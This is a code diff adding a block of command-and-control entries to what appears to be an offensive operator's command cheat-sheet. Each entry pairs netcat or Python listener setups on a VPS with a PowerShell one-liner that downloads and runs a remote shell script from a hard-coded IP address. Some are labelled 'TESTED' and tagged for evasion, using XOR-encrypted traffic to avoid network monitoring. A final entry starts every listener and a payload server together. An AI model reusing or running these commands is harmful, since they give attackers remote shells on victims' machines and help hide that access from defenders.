@@ -4721,6 +4721,45 @@ const COMMANDS = [
   },
 
   // ═══════════════════════════════════════════════════════════════
+  // MULTI-SHELL C2 OPTIONS
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[C2] TCP Shell - Port 5555",
+    desc: "TESTED: Simple TCP shell on alternate port. Good for redundancy.",
+    code: "# VPS: nc -lvnp 5555\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_tcp5555.ps1 -UseBasicParsing)",
+    tags: ["ps", "c2", "playbook"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[C2] Encrypted Shell - Port 6666",
+    desc: "TESTED: XOR-encrypted traffic. Basic obfuscation for network monitoring.",
+    code: "# VPS: python3 /opt/c2_encrypted.py\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_encrypted.ps1 -UseBasicParsing)",
+    tags: ["ps", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[C2] HTTP Beacon Shell - Port 8080",
+    desc: "HTTP-based beaconing. Works through proxies, more reliable.",
+    code: "# VPS: python3 /opt/c2_http.py\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_http.ps1 -UseBasicParsing)",
+    tags: ["ps", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[C2] Multi-Port Resilient Shell",
+    desc: "Tries 4444,5555,443,80,8080 until one works. Maximum reliability.",
+    code: "# Start listeners on VPS:\ntmux new -d -s c2 'python3 /opt/c2_multi.py 4444'\nnc -lvnp 5555 &\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_multi.ps1 -UseBasicParsing)",
+    tags: ["ps", "c2", "playbook"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[C2] Start All Listeners",
+    desc: "VPS command to start all C2 listeners at once.",
+    code: "# Main C2 (multi-session)\ntmux new -d -s c2 'python3 /opt/c2_multi.py 4444'\n\n# Simple TCP\nnc -lvnp 5555 &\n\n# Encrypted\ntmux new -d -s enc 'python3 /opt/c2_encrypted.py'\n\n# HTTP Beacon\ntmux new -d -s http 'python3 /opt/c2_http.py'\n\n# Payload server\ncd /opt && python3 -m http.server 8889 &",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+
+  // ═══════════════════════════════════════════════════════════════
   // PERSISTENCE
   // ═══════════════════════════════════════════════════════════════
   {
